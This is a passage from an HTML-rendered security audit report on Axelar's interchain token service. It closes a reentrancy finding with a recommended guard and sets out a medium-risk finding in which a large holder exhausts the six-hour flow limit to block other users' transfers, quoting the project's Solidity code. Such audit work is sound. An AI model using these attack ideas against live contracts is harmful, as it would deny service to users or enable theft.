Mitigation Steps</h3>\n<p>Consider adding re-entrancy protection to the <code>TokenManagerLiquidityPool._takeToken</code> and <code>TokenManagerLockUnlock._takeToken</code> functions, for example by using the <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master\">ReentrancyGuard</a> from OpenZeppelin.</p>\n<h3 id=\"assessed-type-1\" style=\"position:relative;\"><a href=\"#assessed-type-1\" aria-label=\"assessed type 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Reentrancy</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/317#issuecomment-1693739752\">deanamiel (Axelar) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We have added a separate token manager for fee on transfer tokens, which is protected from reentrancy.</p>\n<p>Link to the public PR: <a href=\"https://github.com/axelarnetwork/interchain-token-service/pull/96\">https://github.com/axelarnetwork/interchain-token-service/pull/96</a>.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-9\" style=\"position:relative;\"><a href=\"#medium-risk-findings-9\" aria-label=\"medium risk findings 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (9)</h1>\n<h2 id=\"m-01-interchain-token-transfer-can-be-dossed-due-to-flow-limit\" style=\"position:relative;\"><a href=\"#m-01-interchain-token-transfer-can-be-dossed-due-to-flow-limit\" aria-label=\"m 01 interchain token transfer can be dossed due to flow limit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/484\">[M-01] Interchain token transfer can be dossed due to flow limit</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/484\">nirlin</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/452\">QiuhaoLi</a></em></p>\n<h3 id=\"lines-of-code\" style=\"position:relative;\"><a href=\"#lines-of-code\" aria-label=\"lines of code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L83-L173\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L83-L173</a><br>\n<a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token/InterchainToken.sol#L1-L106\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token/InterchainToken.sol#L1-L106</a></p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>A large token holder can send back and forth tokens using the flow limit to the capacity in the start of every epoch, making the system unusable for everyone else.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Interchain tokens can be transferred from one chain to another via the token manager and interchain token service. There is a limit imposed for both the flow out and flow in.</p>\n<p>Flow out happens when you send the token from one chain to another. Lets say arbitrum to optimism and you are sending USDC. So in this case, in context of arbitrum, it will be flow out and in context of optimism. Then, it will be flow in and the receiver on optimism will get the tokens via the token manager <code>giveToken()</code> callable by the inter chain token service; however, there is a flow limit imposed per epoch.</p>\n<p>One Epoch <code>=</code> 6 hours long.</p>\n<p>So there cannot be more than a certain amount of tokens sent between the chain per 6 hours. This is done to protect from the uncertain conditions, like a security breach, and to secure as many of the tokens as possible. However, the problem with such a design, is a big token holder or whale could easily exploit it to DOS the other users.</p>\n<p>Consider the following scenario:</p>\n<ol>\n<li>The Epoch starts.</li>\n<li>Limit imposed for the flow is 10 million USDC (considering USDC to be interchain token for ease of understanding).</li>\n<li>A big whale transfer 10 million USDC at the start of the epoch. Those are there, but may or may not receive them on other end right away.</li>\n<li>But the limit has been reached for the specific epoch. Now, no other user can use the axelar interchain token service to transfer that particular token on the dossed lane.</li>\n<li>Now, an attacker can repeat the process across multiple lanes on a multiple chain or one, in the start of every epoch, making it unusable for everyone with a very minimum cost.</li>\n</ol>\n<p>This attack is pretty simple and easy to achieve and also very cheap to do; specifically, on the L2’s or other cheap chains due to low gas prices.</p>\n<p>The functions using the flow limit utility in <code>tokenManager.sol</code> are the following:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sendToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">metadata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_takeToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_addFlowOut</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">interchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">transmitSendToken</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> }(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_getTokenId</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">metadata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Calls the service to initiate the a cross-chain transfer with data after taking the appropriate amount of tokens from the user.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">destinationChain</span><span class=\"mtk3\"> the name of the chain to send tokens to.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk3\"> the address of the user to send tokens to.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk3\"> the amount of tokens to take from msg.sender.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">data</span><span class=\"mtk3\"> the data to pass to the destination contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">callContractWithInterchainToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_takeToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_addFlowOut</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">version</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">interchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">transmitSendToken</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> }(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_getTokenId</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">version</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Calls the service to initiate the a cross-chain transfer after taking the appropriate amount of tokens from the user. This can only be called by the token itself.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk3\"> the address of the user paying for the cross chain transfer.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">destinationChain</span><span class=\"mtk3\"> the name of the chain to send tokens to.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk3\"> the address of the user to send tokens to.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk3\"> the amount of tokens to take from msg.sender.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transmitInterchainTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">metadata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyToken</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_takeToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_addFlowOut</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">interchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">transmitSendToken</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> }(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_getTokenId</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">metadata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> This function gives token to a specified address. Can only be called by the service.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk3\"> the address to give tokens to.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk3\"> the amount of token to give.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> the amount of token actually given, which will only be different than </span><span class=\"mtk8\">`amount`</span><span class=\"mtk3\"> in cases where the token takes some on-transfer fee.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyService</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_addFlowIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> This function sets the flow limit for this TokenManager. Can only be called by the operator.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">flowLimit</span><span class=\"mtk3\"> the maximum difference between the tokens flowing in and/or out at any given interval of time (6h)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFlowLimit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">flowLimit</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOperator</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_setFlowLimit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">flowLimit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 